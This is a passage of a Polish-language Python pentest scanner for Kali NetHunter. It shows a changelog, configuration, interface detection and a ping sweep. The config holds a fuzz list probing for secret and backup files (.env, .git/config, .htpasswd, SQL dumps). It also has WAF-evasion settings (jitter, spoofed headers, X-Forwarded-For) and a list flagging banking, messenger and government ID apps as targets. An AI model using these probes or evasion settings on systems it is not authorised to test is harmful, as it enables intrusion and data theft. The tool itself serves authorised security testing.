#!/usr/bin/env python3
"""
MR.ROOT Scanner v3.8 — NetHunter Edition | REDHUNT-16-BETA | ADB-PENTEST
Autor: MR.ROOT | Kali NetHunter
TYLKO do użytku na własnej sieci lub za pisemną zgodą właściciela.

Zmiany v3.0:
  [1] Weryfikacja SSL + --strict-ssl + ostrzeżenie przy starcie
  [2] Pełna obsługa IPv6 (validate_ip, parse_targets, detect_interface)
  [3] Rozbudowany słownik fuzzera (~100 wpisów) + opcjonalny plik zewnętrzny
  [4] Rate limiting w fuzzerze (threading.BoundedSemaphore + delay)
  [5] Vuln-scan domyślnie top-1000 portów; -p- tylko z --full-ports
  [6] Sprawdzenie uprawnień roota przy starcie
  [7] Limit 2 równoległych procesów NMAP w deep_scan
  [8] Globalny timeout 300 s dla całego skanowania (concurrent.futures.wait)

Zmiany v3.1:
  [9] Tryb Full Scan (all <IP> / -m all) — wszystkie moduły sekwencyjnie,
      Ctrl+C na fazie = skip do następnej, zbiorczy raport JSON na końcu

Zmiany v3.2:
  [10] Integracja z SearchSploit (Exploit-DB) — automatyczne wyszukiwanie
       exploitów dla wykrytych usług (product + version) w deep_scan
  [11] Analizator nagłówków bezpieczeństwa HTTP — sprawdzanie HSTS, CSP,
       X-Frame-Options, X-Content-Type-Options, Permissions-Policy i innych
       w banner_grabber; brakujące nagłówki w raporcie HTML oznaczone czerwienią

Zmiany v3.3:
  [12] Naprawiono detect_interface() dla NetHunter chroot — trzy fallbacki:
       (1) ip route show default, (2) ip route z src, (3) ip addr UP;
       pomijanie wirtualnych interfejsów Androida (ccmni*, dummy*, ifb* itd.)

Zmiany v3.4:
  [13] Wizualne flagowanie urządzeń mobilnych w ping_sweep — ikony 📱/💻
       oparte na słowniku MOBILE_VENDORS (MAC vendor) i słowach kluczowych
       w hostname (iphone, android, galaxy, ipad, pixel, huawei, xiaomi...)
  [14] Nowy moduł mobile_scan(ip) — komenda: m <IP>
       Skanuje dedykowane porty mobilne: ADB (5555), Apple Lockdown (62078),
       KDE Connect (1714-1764), AirDroid/ShareIt (8888/8890/5959),
       AirPlay (7000/7100). Wyniki w raporcie JSON.
  [15] Rozszerzone identity_scan — parsowanie rekordów mDNS/Bonjour
       pod kątem iOS (_apple-mobdev2, _airplay, _sleep-proxy) i Android
       (_googlecast, adb). Wypisuje "Prawdopodobnie iOS/Android" w karcie.
  [16] Dodano komendę mf <IP> — Mobile Fuzzer (szukanie katalogów Android/iOS)


Zmiany v3.8 — ADB-PENTEST:
  [25] Nowy moduł ADB Pentest Audit (komenda: adb / adb-frida / adb-dump)
       • Device Info — getprop (model, brand, Android, SDK, ABI, kernel,
         build_type, build_tags, verified_boot, SELinux, ro.debuggable,
         ro.secure, su check, usb_config, adb_tcp_port)
       • Debug Surface Analysis — automatyczne findings HIGH/MED/INFO
         (debuggable=1, secure=0, SELinux=Permissive, ADB TCP active, itd.)
       • APK Enumeration — user apps, system apps, flagowanie interesujących
         (banking, kommunikatory, root tools, mObywatel...)
       • Frida SSL Unpin — push frida-server przez ADB USB, uruchomienie,
         universal SSL bypass (OkHttp3 + TrustManager + Conscrypt)
       • Traffic Dump — push statyczny tcpdump ARM64, capture do .pcap,
         auto-pull na hosta, raport JSON
Zmiany v3.6 — STEALTH-UPDATE:
  [19] Smart Delay + Jitter w fuzzerze — losowe opóźnienia (JITTER_MIN/MAX) zamiast
       stałego 80 ms, utrudnia detekcję heurystyczną przez WAF/IPS
  [20] Zaawansowana rotacja nagłówków — EXTENDED_HEADERS_POOL z Accept-Language,
       Referer, Sec-Ch-Ua (Client Hints), X-Forwarded-For; _smart_headers()
  [21] Moduł WAF-Bypass via fragmentacja — _hpp_url() (HTTP Parameter Pollution),
       _send_chunked() (Chunked Transfer Encoding przez raw socket)
  [22] Detekcja Rate Limiting + Cooldown — automatyczne rozpoznanie 403/429/503
       i wstrzymanie skanowania (domyślnie 300 s) przed dalszymi żądaniami
  [23] Integracja z Playwright (headless browser) — komenda: hw <URL>
       Wymaga: pip install playwright && playwright install chromium
  [24] Ulepszony moduł SQLMap — obsługa --proxy (Tor/proxy list), więcej
       łańcuchów tamperów 2026, nowe flagi anty-WAF

Zmiany v3.5 — REDHUNT-16-BETA:
  [17] Komenda: sql <URL> — SQLMap Auto-Tamper WAF-Bypass Module
       • Rotacja 6 najlepszych łańcuchów tamperów 2025/2026
       • NIST SP 800-115 + OWASP Testing Guide compliance
       • Live detection + raport JSON
       • Pełna integracja z istniejącym stylem terminala NetHunter
  [18] Komenda: auto-sql <URL> — Auto-Spider + SQLMap
       • Wchodzi na podaną stronę i wyciąga wszystkie linki href
       • Deduplikuje wektory ataku po sygnaturze (ścieżka + zestaw param)
       • Automatycznie odpala sql_scan() na każdym unikalnym endpoincie
       • Zero zewnętrznych zależności (tylko re + urllib.parse z stdlib)
"""

import nmap
import os
import sys
import json
import hashlib
import datetime
import ipaddress
import socket
import ssl
import time
import threading
import urllib.request
from urllib.error import HTTPError, URLError
import subprocess
import argparse
import random
import re
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed, wait
import shutil

# =========================
# ANSI COLORS
# =========================
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

def c(color, text):
    return f"{color}{text}{C.RESET}"

# =========================
# GLOBAL STATE
# =========================
STRICT_SSL   = False   # ustawiane przez argparse --strict-ssl
FULL_PORTS   = False   # ustawiane przez argparse --full-ports
SQL_RESUME   = False   # [v3.7] ustawiane przez argparse --resume
FUZZ_DELAY   = 0.08    # bazowe opóźnienie (s) między żądaniami fuzzera
JITTER_MIN   = 0.3     # [v3.6] minimalne losowe opóźnienie jitter (s)
JITTER_MAX   = 1.8     # [v3.6] maksymalne losowe opóźnienie jitter (s)
SCAN_TIMEOUT = 300     # globalny timeout (sekundy) dla run_scan
MAX_PARALLEL_NMAP = 2  # max równoległych procesów NMAP
COOLDOWN_TIME = 300    # [v3.6] czas wstrzymania (s) po wykryciu rate-limit

# [v3.7] Stan rate-limitera per-IP — dict {ip_key: {"triggered", "trigger_time", "hit_count"}}
# Klucz = hostname wyciągnięty z URL. Cooldown jednego celu nie blokuje pozostałych.
_RL_LOCK  = threading.Lock()
_RL_STATE: dict = {}  # {ip_key: {"triggered": bool, "trigger_time": float, "hit_count": int}}

# =========================
# CONFIG
# =========================
def _detect_base_dir():
    for candidate in ["/MR.ROOT", os.path.expanduser("~/MR.ROOT"), "/sdcard/MR.ROOT", "/tmp/MR.ROOT"]:
        try:
            os.makedirs(candidate, exist_ok=True)
            test = os.path.join(candidate, ".write_test")
            with open(test, "w") as f:
                f.write("ok")
            os.remove(test)
            return candidate
        except Exception:
            continue
    return "/tmp/MR.ROOT"

BASE_DIR   = _detect_base_dir()
REPORT_DIR = f"{BASE_DIR}/reports"
HTML_DIR   = f"{REPORT_DIR}/html"
CACHE_FILE = f"{BASE_DIR}/cache.json"

NMAP_FAST  = "-T4 --max-retries 2 --host-timeout 30s --max-rtt-timeout 500ms"
NMAP_DEEP  = "-T4 --max-retries 3 --host-timeout 120s"

SNMP_COMMUNITIES = ["public", "private", "community", "admin", "manager", "cisco", "snmp"]
BANNER_PORTS     = [80, 443, 8008, 8080, 8081, 8443, 8888, 9000, 9090, 3000, 5000]

# [v3.4] Słownik producentów urządzeń mobilnych (dopasowanie do MAC vendor string)
MOBILE_VENDORS = [
    "apple", "samsung", "huawei", "xiaomi", "google", "motorola",
    "oneplus", "oppo", "vivo", "realme", "nokia", "sony", "zte",
    "lenovo", "meizu", "honor", "nothing", "fairphone", "tcl",
    "hmd global", "blackberry", "alcatel", "lg electronics",
]

# Słowa kluczowe w hostname wskazujące na urządzenie mobilne
MOBILE_HOSTNAME_KEYWORDS = [
    "iphone", "ipad", "ipod", "android", "galaxy", "pixel",
    "huawei", "xiaomi", "redmi", "oneplus", "oppo", "vivo",
    "phone", "mobile", "tablet",
]

# [v3.4] Porty specyficzne dla urządzeń mobilnych
MOBILE_PORTS = {
    5555:  "Android ADB (Wi-Fi Debug)",
    62078: "Apple Lockdown / Wi-Fi Sync (iOS)",
    1714:  "KDE Connect / GSConnect",
    1716:  "KDE Connect / GSConnect",
    1764:  "KDE Connect / GSConnect",
    8888:  "AirDroid / WebKey",
    8890:  "AirDroid (alt)",
    5959:  "ShareIt / ADB alt",
    7000:  "Apple AirPlay",
    7100:  "Apple AirPlay (alt)",
}

# =========================
# [v3.8] ADB PENTEST CONFIG
# =========================

# Ścieżka do frida-server ARM64 na hoście (pobierz z github.com/frida/frida/releases)
# Dopasuj wersję do: frida --version
FRIDA_SERVER_LOCAL  = "/MR.ROOT/frida-server"
FRIDA_SERVER_REMOTE = "/data/local/tmp/frida-server"

# Statyczny tcpdump ARM64 (https://github.com/extremecoders-re/tcpdump-android-builds)
TCPDUMP_LOCAL  = "/MR.ROOT/tcpdump"
TCPDUMP_REMOTE = "/data/local/tmp/tcpdump"

# Domyślny czas trwania dumpu ruchu (sekundy)
TRAFFIC_DUMP_DURATION = 30

# Pakiety "interesujące" z punktu widzenia pentestów mobilnych
_INTERESTING_PACKAGES = [
    # Banking PL / fintech
    "com.mbank", "pl.mbank", "pl.pkobp", "pl.ing", "pl.bzwbk",
    "com.santander", "pl.aliorbank", "pl.blik",
    # E-commerce / płatności
    "com.google.android.apps.walletnfcrel", "com.paypal.android",
    "pl.allegro", "com.olx", "pl.ceneo",
    # Komunikatory E2E
    "org.thoughtcrime.securesms", "com.whatsapp", "com.telegram.messenger",
    "com.discord", "pl.plusmessenger",
    # VPN / proxy / privacy
    "com.nordvpn.android", "com.expressvpn.vpn", "net.mullvad.mullvadvpn",
    "org.torproject.torbrowser", "com.termux",
    # Root / system tools
    "com.topjohnwu.magisk", "eu.chainfire.supersu",
    "com.koushikdutta.rommanager",
    # Identyfikacja rządowa (Polska)
    "pl.gov.mObywatel",
    # System / debug
    "com.android.settings", "com.android.shell", "com.android.adbkeystore",
]


# [v3.0] Rozbudowany słownik fuzzera (~100 wpisów)
FUZZ_PATHS = [
    # Konfiguracja / sekrety
    "/.env", "/.env.local", "/.env.backup", "/.env.prod",
    "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
    "/.svn/entries", "/.svn/wc.db",
    "/.htaccess", "/.htpasswd",
    "/config.php", "/config.php.bak", "/config.bak",
    "/configuration.php", "/wp-config.php.bak",
    "/settings.php", "/database.yml", "/database.php",
    "/local_settings.py", "/settings.py", "/secrets.json",

    # Backup / archiwum
    "/backup.zip", "/backup.tar.gz", "/backup.sql",
    "/bak.zip", "/site.zip", "/www.zip", "/db.zip",
    "/db.sql", "/db.sqlite", "/dump.sql",
    "/old/", "/backup/", "/backups/", "/_backup/",

    # Panel admina
    "/admin/", "/admin.php", "/admin.html", "/admin/login",
    "/administrator/", "/administrator/index.php",
    "/wp-admin/", "/wp-admin/install.php",
    "/manager/html", "/manager/status",
    "/controlpanel/", "/cpanel/", "/panel/",
    "/dashboard/", "/backend/",

    # API / Swagger / GraphQL
    "/api/", "/api/v1/", "/api/v2/",
    "/api/v1/swagger", "/api/swagger.json",
    "/swagger/", "/swagger-ui/", "/swagger-ui.html",
    "/openapi.json", "/api-docs/", "/graphql",
    "/graphiql",

    # Diagnostyka / info
    "/phpinfo.php", "/test.php", "/info.php",
    "/server-status", "/server-info",
    "/status", "/health", "/healthz", "/ping",
    "/metrics", "/actuator", "/actuator/health",
    "/actuator/env", "/actuator/mappings",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/security.txt", "/.well-known/security.txt",

    # Bazy / phpmyadmin
    "/phpmyadmin/", "/pma/", "/phpMyAdmin/",
    "/mysql/", "/adminer.php", "/adminer/",

    # CGI / legacy
    "/cgi-bin/", "/cgi-bin/test-cgi", "/cgi-bin/printenv",
    "/cgi-bin/admin.cgi",

    # Logowanie
    "/login", "/login.php", "/login.html",
    "/signin", "/sign-in", "/auth", "/auth/login",
    "/user/login", "/account/login",

    # Pliki instalacyjne / reszki
    "/install.php", "/install/", "/setup.php", "/setup/",
    "/upgrade.php", "/update.php",
    "/CHANGELOG", "/CHANGELOG.md", "/CHANGELOG.txt",
    "/README", "/README.md", "/VERSION",
    "/composer.json", "/package.json",
    "/Dockerfile", "/docker-compose.yml",

    # Misc / ukryte
    "/trace.axd", "/elmah.axd",             # ASP.NET
    "/.DS_Store",                             # macOS artefakt
    "/web.config", "/applicationHost.config", # IIS
    "/WEB-INF/web.xml",                       # Java/Tomcat
    "/.well-known/",
]

USER_AGENTS = [
    # Chrome 124 / Windows — pełny fingerprint z Client Hints
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Chrome 120 / Windows (poprzedni wpis — zostawiony dla różnorodności)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Safari / macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    # Chrome Mobile / Android
    "Mozilla/5.0 (Linux; Android 14; 23049PCD8G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    # Firefox / Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    # Edge / Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    # MR.ROOT identyfikator (edukacyjny)
    "MR.ROOT-Recon/3.6 (Educational Network Scanner)"
]

# [v3.6] Nagłówki Client Hints dla Chrome — WAF sprawdza ich obecność
# przy nowoczesnych UA. Brak = natychmiastowa detekcja bota.
_CH_UA_MAP = {
    "Chrome/124": (
        '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        '"Windows"'
    ),
    "Chrome/120": (
        '"Chromium";v="120", "Google Chrome";v="120", "Not-A.Brand";v="99"',
        '"Windows"'
    ),
    "Firefox": (None, None),   # Firefox nie używa Ch-Ua
    "Safari":  (None, None),
    "Edg/124": (
        '"Microsoft Edge";v="124", "Chromium";v="124", "Not-A.Brand";v="99"',
        '"Windows"'
    ),
}

_ACCEPT_LANGUAGES = [
    "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-US,en;q=0.9,pl;q=0.8",
    "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
]

_REFERER_POOL = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://search.yahoo.com/",
    None,  # brak Referera — też naturalny dla bezpośrednich wejść
]

# Losowe prywatne IP dla X-Forwarded-For (źle skonfigurowane proxy przepuszczają)
_XFF_POOL = [
    "10.0.0.1", "10.0.1.5", "192.168.1.254",
    "172.16.0.1", "10.10.10.10",
]

VULN_SCRIPTS = [
    "vuln", "ssl-heartbleed", "ssl-poodle", "ssl-dh-params",
    "smb-vuln-ms17-010", "smb-vuln-ms08-067",
    "http-vuln-cve2017-5638", "http-shellshock"
]

# =========================
# [v3.2] SECURITY HEADERS CONFIG
# =========================
SECURITY_HEADERS = {
    "Strict-Transport-Security": (
        "HSTS — brak wymuszania HTTPS; możliwy atak downgrade / SSL-strip",
        "HIGH"
    ),
    "Content-Security-Policy": (
        "CSP — brak polityki treści; ryzyko XSS i data-injection",
        "HIGH"
    ),
    "X-Frame-Options": (
        "Brak ochrony przed Clickjacking (iframe embedding)",
        "MEDIUM"
    ),
    "X-Content-Type-Options": (
        "Brak 'nosniff'; ryzyko MIME-type sniffing attacks",
        "MEDIUM"
    ),
    "Referrer-Policy": (
        "Brak polityki Referrer; wyciek URL w nagłówkach żądań",
        "LOW"
    ),
    "Permissions-Policy": (
        "Brak ograniczeń uprawnień przeglądarki (kamera, mikrofon, geolokalizacja)",
        "LOW"
    ),
    "X-XSS-Protection": (
        "Brak legacy XSS filter (ważne dla IE/starszych przeglądarek)",
        "LOW"
    ),
}

DANGEROUS_HEADERS = {
    "Server":           "Info-disclosure: wersja serwera widoczna dla atakującego",
    "X-Powered-By":     "Info-disclosure: framework/język po stronie serwera ujawniony",
    "X-AspNet-Version": "Info-disclosure: wersja ASP.NET ujawniona",
    "X-Generator":      "Info-disclosure: CMS/generator ujawniony",
}

os.makedirs(REPORT_DIR, exist_ok=True)
os.makedirs(HTML_DIR, exist_ok=True)

# =========================
# BANNER & HELP
# =========================
BANNER = f"""
{C.GREEN}{C.BOLD}
  ███╗   ███╗██████╗     ██████╗  ██████╗  ██████╗ ████████╗
  ████╗ ████║██╔══██╗    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
  ██╔████╔██║██████╔╝    ██████╔╝██║   ██║██║   ██║   ██║
  ██║╚██╔╝██║██╔══██╗    ██╔══██╗██║   ██║██║   ██║   ██║
  ██║ ╚═╝ ██║██║  ██║    ██║  ██║╚██████╔╝╚██████╔╝   ██║
  ╚═╝     ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝{C.RESET}
{C.DIM}        Mobilny Skaner Sieci | by MR.ROOT | NetHunter Edition v3.8 REDHUNT-16-BETA | ADB-PENTEST{C.RESET}
"""

HELP_TEXT = f"""
{c(C.CYAN+C.BOLD, "═══ KOMENDY INTERAKTYWNE ═══")}
  {c(C.GREEN, "<IP / IPv6>")}         Deep Scan — porty, OS, HTTP
  {c(C.GREEN, "<IP,IP,...>")}         Wiele celów naraz
  {c(C.GREEN, "<CIDR>")}             Skan podsieci (np. 192.168.1.0/24 lub fd00::/64)
  {c(C.GREEN, "i <IP>")}             Identity Scan — mDNS, NetBIOS, SMB, UPnP
  {c(C.GREEN, "snmp <IP>")}          SNMP Scan — community brute + info
  {c(C.GREEN, "v <IP>")}             Vuln-Scan NSE — CVE, Heartbleed, EternalBlue
  {c(C.GREEN, "b <IP>")}             Banner Grabber — HTTP/HTTPS + raport HTML
  {c(C.GREEN, "f <IP> [wordlist]")}   Fuzzer Ścieżek — ukryte pliki (opcj. plik słownika)
  {c(C.GREEN+C.BOLD, "m <IP>")}             {c(C.YELLOW+C.BOLD, "Mobile Scan — porty ADB/iOS/AirPlay/KDE Connect + mDNS")}
  {c(C.GREEN+C.BOLD, "mf <IP>")}            {c(C.YELLOW+C.BOLD, "Mobile Fuzzer — szukanie otwartych katalogów Android/iOS")}
  {c(C.GREEN+C.BOLD, "all <IP>")}           {c(C.YELLOW+C.BOLD, "Full Scan — wszystkie moduły sekwencyjnie + zbiorczy raport")}
  {c(C.GREEN+C.BOLD, "all-net [CIDR]")}     {c(C.YELLOW+C.BOLD, "Full Scan całej sieci — sweep + full_scan każdego hosta")}
  {c(C.GREEN+C.BOLD, "sql <URL>")}          {c(C.RED+C.BOLD, "[v3.5] SQLMap Auto-Tamper WAF-Bypass (8 łańcuchów 2025/2026)")}
  {c(C.GREEN+C.BOLD, "auto-sql <URL>")}     {c(C.RED+C.BOLD, "[v3.5] Auto-Spider + SQLMap (crawl → deduplikacja → atak)")}
  {c(C.GREEN+C.BOLD, "hw <URL>")}           {c(C.YELLOW+C.BOLD, "[v3.6] Headless Browser Scan — Playwright (omija JS/CAPTCHA)")}
  {c(C.GREEN+C.BOLD, "hpp <URL>")}          {c(C.YELLOW+C.BOLD, "[v3.6] HTTP Parameter Pollution — test WAF-bypass (GET)")}
  {c(C.GREEN+C.BOLD, "adb")}               {c(C.CYAN+C.BOLD, "[v3.8] ADB Audit — device info, APK enum, debug surface (USB)")}
  {c(C.GREEN+C.BOLD, "adb <package>")}     {c(C.CYAN+C.BOLD, "[v3.8] ADB Audit + Frida SSL Unpin na wskazanej apce")}
  {c(C.GREEN+C.BOLD, "adb-frida <pkg>")}   {c(C.CYAN+C.BOLD, "[v3.8] Frida SSL Unpin — push frida-server + inject")}
  {c(C.GREEN+C.BOLD, "adb-dump [sec]")}    {c(C.CYAN+C.BOLD, "[v3.8] tcpdump capture przez ADB USB (domyślnie 30s)")}
  {c(C.GREEN, "sweep")}              Ping Sweep aktywnej podsieci (z flagowaniem 📱/💻)
  {c(C.GREEN, "sweep <CIDR>")}       Ping Sweep podanej podsieci
  {c(C.GREEN, "h")}                  Ta pomoc
  {c(C.GREEN, "q / exit")}           Wyjście
{c(C.DIM, "  Flagi CLI: --strict-ssl  --full-ports  --resume (SQLMap: wznów sesję)")}
{c(C.DIM, f"  Raporty: {REPORT_DIR}")}
"""

# =========================
# LOGGING & UTILS
# =========================
def log(level, msg):
    icons = {
        "info":  c(C.CYAN,          "[*]"),
        "ok":    c(C.GREEN,         "[+]"),
        "warn":  c(C.YELLOW,        "[!]"),
        "err":   c(C.RED,           "[✗]"),
        "scan":  c(C.BLUE+C.BOLD,   "[→]"),
        "cache": c(C.DIM,           "[C]"),
        "vuln":  c(C.RED+C.BOLD,    "[⚠]"),
    }
    print(f"{icons.get(level, '[?]')} {msg}")

def now():
    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def is_ipv6(ip):
    try:
        return isinstance(ipaddress.ip_address(ip), ipaddress.IPv6Address)
    except ValueError:
        return False

def ip_to_filename(ip):
    return ip.replace(".", "-").replace(":", "_")

def get_ssl_ctx():
    if STRICT_SSL:
        return ssl.create_default_context()
    return ssl._create_unverified_context()

# =========================
# CACHE
# =========================
def load_cache():
    if os.path.exists(CACHE_FILE):
        try:
            with open(CACHE_FILE) as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_cache(cache):
    try:
        with open(CACHE_FILE, "w") as f:
            json.dump(cache, f, indent=2)
    except Exception as e:
        log("err", f"Cache save error: {e}")

CACHE = load_cache()

# =========================
# [v3.2] SEARCHSPLOIT INTEGRATION
# =========================
def _check_searchsploit_available():
    try:
        subprocess.check_output(
            ["searchsploit", "--version"],
            stderr=subprocess.STDOUT, timeout=5
        )
        return True
    except (FileNotFoundError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
        return False

_SEARCHSPLOIT_AVAILABLE = None

def searchsploit_lookup(product, version):
    global _SEARCHSPLOIT_AVAILABLE

    if _SEARCHSPLOIT_AVAILABLE is None:
        _SEARCHSPLOIT_AVAILABLE = _check_searchsploit_available()
        if not _SEARCHSPLOIT_AVAILABLE:
            log("warn", "SearchSploit niedostępny — pomiń lub zainstaluj: apt install exploitdb")

    if not _SEARCHSPLOIT_AVAILABLE:
        return []

    query_parts = [p for p in [product.strip(), version.strip()] if p]
    if not query_parts:
        return []
    query = " ".join(query_parts)

    try:
        raw = subprocess.check_output(
            ["searchsploit", "--json", "--disable-colour", query],
            stderr=subprocess.DEVNULL,
            timeout=15
        )
        data = json.loads(raw.decode("utf-8", errors="ignore"))
    except subprocess.TimeoutExpired:
        log("warn", f"SearchSploit timeout dla: {query}")
        return []
    except (json.JSONDecodeError, subprocess.CalledProcessError, Exception):
        return []

    exploits = []
    for entry in data.get("RESULTS_EXPLOIT", []):
        exploits.append({
            "title":    entry.get("Title", ""),
            "path":     entry.get("Path", ""),
            "type":     entry.get("Type", ""),
            "platform": entry.get("Platform", ""),
            "date":     entry.get("Date", ""),
            "edb_id":   entry.get("EDB-ID", ""),
        })
    return exploits

# =========================
# NETWORK & ENVIRONMENT
# =========================
def detect_interface():
    """
    [v3.3] Wykrywa aktywny interfejs sieciowy; zwraca (iface, IPv4, sieć/CIDR, IPv6).
    Trzy fallbacki kolejno próbowane.
    """
    _SKIP_PREFIXES = (
        "lo", "ccmni", "dummy", "ifb", "tunl", "sit",
        "ip_vti", "ip6", "p2p", "ap0", "rmnet",
    )

    def _ipv6_for(iface):
        try:
            out = subprocess.check_output(
                ["ip", "-6", "addr", "show", iface],
                stderr=subprocess.DEVNULL, text=True
            )
            for line in out.splitlines():
                line = line.strip()
                if line.startswith("inet6 "):
                    candidate = ipaddress.ip_interface(line.split()[1]).ip
                    if not candidate.is_link_local:
                        return str(candidate)
        except Exception:
            pass
        return None

    def _build_result(iface, cidr):
        ip4  = cidr.split("/")[0]
        net4 = str(ipaddress.IPv4Network(cidr, strict=False))
        ip6  = _ipv6_for(iface)
        return iface, ip4, net4, ip6

    # Fallback 1: ip route show default
    try:
        out = subprocess.check_output(
            ["ip", "route", "show", "default"],
            stderr=subprocess.DEVNULL, text=True
        )
        for line in out.splitlines():
            parts = line.split()
            if "dev" in parts:
                iface = parts[parts.index("dev") + 1]
                addr4 = subprocess.check_output(
                    ["ip", "-4", "addr", "show", iface],
                    stderr=subprocess.DEVNULL, text=True
                )
                for iline in addr4.splitlines():
                    iline = iline.strip()
                    if iline.startswith("inet "):
                        return _build_result(iface, iline.split()[1])
    except Exception:
        pass

    # Fallback 2: ip route z src
    try:
        out = subprocess.check_output(
            ["ip", "route"], stderr=subprocess.DEVNULL, text=True
        )
        for line in out.splitlines():
            parts = line.split()
            if "dev" not in parts or "src" not in parts:
                continue
            iface = parts[parts.index("dev") + 1]
            if any(iface.startswith(p) for p in _SKIP_PREFIXES):
                continue
            network_token = parts[0]
            src_ip = parts[parts.index("src") + 1]
            try:
                net_obj = ipaddress.IPv4Network(network_token, strict=False)
                if ipaddress.IPv4Address(src_ip) in net_obj:
                    cidr = f"{src_ip}/{net_obj.prefixlen}"
                    return _build_result(iface, cidr)
            except ValueError:
                continue
    except Exception:
        pass

    # Fallback 3: ip addr — pierwszy interfejs UP
    try:
        out = subprocess.check_output(
            ["ip", "-4", "addr"], stderr=subprocess.DEVNULL, text=True
        )
        current_iface = None
        for line in out.splitlines():
            stripped = line.strip()
            if not line.startswith(" ") and ":" in line:
                parts = line.split(":")
                if len(parts) >= 2:
                    candidate = parts[1].strip().split("@")[0]
                    if any(candidate.startswith(p) for p in _SKIP_PREFIXES):
                        current_iface = None
                        continue
                    current_iface = candidate if ("UP" in line and "LOWER_UP" in line) else None
            elif stripped.startswith("inet ") and current_iface:
                return _build_result(current_iface, stripped.split()[1])
    except Exception:
        pass

    return None, None, None, None

def check_captive_portal():
    log("info", "Sprawdzanie stanu połączenia sieciowego...")
    try:
        req = urllib.request.Request(
            "http://clients3.google.com/generate_204",
            headers={"User-Agent": random.choice(USER_AGENTS)}
        )
        res = urllib.request.urlopen(req, timeout=3)
        if res.status == 204:
            log("ok", "Dostęp do internetu: Czysty (Brak Captive Portal).")
        else:
            log("warn", f"Możliwy Captive Portal! Zwrócono status: {res.status}")
    except Exception:
        log("warn", "Brak dostępu do internetu lub sieć mocno restrykcyjna.")

def parse_targets(inp):
    out = []
    for token in inp.split(","):
        token = token.strip()
        if not token:
            continue
        try:
            net = ipaddress.ip_network(token, strict=False)
            if isinstance(net, ipaddress.IPv4Network):
                out.extend([str(h) for h in net.hosts()])
            else:
                hosts = list(net.hosts())
                if len(hosts) > 256:
                    log("warn", f"Sieć IPv6 ma {len(hosts)} hostów — ograniczono do 256.")
                    hosts = hosts[:256]
                out.extend([str(h) for h in hosts])
            continue
        except ValueError:
            pass
        if validate_ip(token):
            out.append(token)
    return list(dict.fromkeys(out))

# =========================
# MODULES
# =========================
def ping_sweep(network=None):
    iface, my_ip, detected_net, my_ip6 = detect_interface()
    target_net = network or detected_net

    if not target_net:
        log("err", "Nie można wykryć sieci. Podaj CIDR: sweep 192.168.1.0/24")
        return []

    if iface:
        ip6_info = f" | IPv6: {c(C.GREEN, my_ip6)}" if my_ip6 else ""
        log("info", f"Interfejs: {c(C.GREEN, iface)} | IP: {c(C.GREEN, my_ip)} | Sieć: {c(C.GREEN, target_net)}{ip6_info}")
    log("scan", f"Ping sweep → {c(C.WHITE+C.BOLD, target_net)} ...")

    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=target_net, arguments="-sn -T4 --max-rtt-timeout 300ms")
    except Exception as e:
        log("err", f"Ping sweep error: {e}")
        return []

    alive = []
    print()

    def sort_key(x):
        try:
            return ipaddress.ip_address(x)
        except ValueError:
            return x

    for host in sorted(nm.all_hosts(), key=sort_key):
        if nm[host].state() == "up":
            try:
                hostname = socket.gethostbyaddr(host)[0]
            except Exception:
                hostname = ""
            addrs  = nm[host].get("addresses", {})
            mac    = addrs.get("mac", "??:??:??:??:??:??")
            vendor = nm[host].get("vendor", {}).get(mac, "")

            vendor_lower   = vendor.lower()
            hostname_lower = hostname.lower()
            is_mobile = (
                any(v in vendor_lower   for v in MOBILE_VENDORS) or
                any(k in hostname_lower for k in MOBILE_HOSTNAME_KEYWORDS)
            )
            icon = "📱" if is_mobile else "💻"

            alive.append({"ip": host, "hostname": hostname, "mac": mac, "vendor": vendor, "mobile": is_mobile})
            print(f"  {icon} {c(C.WHITE+C.BOLD, host):<42} {c(C.DIM, hostname or '—'):<35} {c(C.YELLOW, mac)} {c(C.CYAN, vendor)}")

    print()
    mobile_count = sum(1 for h in alive if h.get("mobile"))
    log("ok", f"Aktywnych hostów: {c(C.GREEN+C.BOLD, str(len(alive)))}  📱 mobilnych: {c(C.CYAN+C.BOLD, str(mobile_count))}")

    ts = now()
    txt_file = f"{REPORT_DIR}/sweep_{ts}.txt"
    with open(txt_file, "w") as f:
        f.write(f"Ping Sweep: {target_net} — {ts}\n\n")
        for h in alive:
            mob = "📱" if h.get("mobile") else "💻"
            f.write(f"{mob} {h['ip']:<42} {h['hostname']:<35} {h['mac']} {h['vendor']}\n")
    log("ok", f"Raport: {txt_file}")
